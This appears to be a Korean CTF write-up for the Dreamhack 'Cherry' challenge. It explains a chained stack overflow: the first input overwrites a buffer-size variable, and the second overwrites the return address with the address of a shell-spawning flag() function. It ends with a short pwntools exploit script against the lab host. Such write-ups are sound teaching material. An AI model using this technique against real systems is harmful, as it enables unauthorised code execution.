# 문제명

## 문제 설명

-드림핵 Cherry 문제는 스택 메모리에 배치된 변수 간의 위치 간격을 이용해 크기 제어 변수를 조작하고 스택 버퍼 오버플로우를 발생시키는 문제입니다. 

-문제 URL: Dreamhack - Cherry
-보호기법: No Canary, No PIE (gcc -fno-stack-protector -no-pie)
-제공 파일: chall, chall.c

## 풀이

### 분석

-main() 함수에서 read()를 통해 1차 입력을 받는데 입력받는 buf 변수의 크기는 6바이트이지만 읽어들이는 크기인 buf_size는 16바이트로 설정되어 있습니다. 디버깅을 통해 스택 프레임을 확인해 보면 buf와 buf_size 변수 사이의 거리가 12바이트에 불과하므로 1차 입력 시 12바이트 이후의 데이터를 덮어써서 buf_size 변수의 값을 크게 변조할 수 있습니다. 입력받은 문자열이 cherry로 시작한다는 조건문만 통과하면 2차 입력을 받게 되고  프로그램 내부에는 /bin/sh을 실행해 주는 flag() 함수가 이미 존재하고 있습니다.

### 취약점

-1차 read() 호출 시 변수 간 격차보다 많은 데이터를 입력하여 buf_size 변수를 크게 덮어쓸 수 있는 변수 변조 취약점이 존재합니다. 이렇게 늘려놓은 buf_size 변수 때문에 2차 read() 입력 시 fruit 버퍼의 크기를 초과하여 데이터를 채울 수 있는 스택 버퍼 오버플로우 취약점이 연속으로 발생하며 이를 통해서 Return Address(RET)를 조작할 수 있게 됩니다.

### 익스플로잇

-먼저 1차 입력으로 조건 검사를 통과할 cherry 6바이트와 패딩 10바이트를 함께 보내 buf_size 변수를 큰 값으로 변조합니다. 이어서 2차 입력에서는 fruit 버퍼부터 SFP까지의 거리인 26바이트를 더미 데이터로 채운 뒤 Return Address 위치에 flag() 함수의 주소를 덮어씁니다. 결과적으로 함수가 종료될 때 조작된 RET 주소로 이동하면서 쉘이 실행됩니다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 13902) # 본인의 포트 번호 적용
e = ELF('./chall')
shell = e.symbols['flag']

p.recvuntil(b': ')
p.send(b'cherry' + b'A'*10)
p.recvuntil(b': ')
p.send(b'a'*26 + p64(shell))
p.interactive()
```

## 배운 점
-이번 문제를 통해 단순 선언된 변수 크기만 확인하는 것이 아니라 디버깅을 통해서 스택 프레임 내 실제 변수 간의 거리 오프셋을 파악하는 중요성을 배웠습니다. 또 1차 오버플로우로 데이터 크기 제한을 해제하고 2차 오버플로우로 프로그램의 제어권을 획득하는 연쇄적 공격 구조와 No PIE 환경에서 심볼 주소를 활용해 실행 흐름을 원하는 함수로 돌리는 핵심 익스플로잇 원리를 확실히 이해할 수 있었습니다.
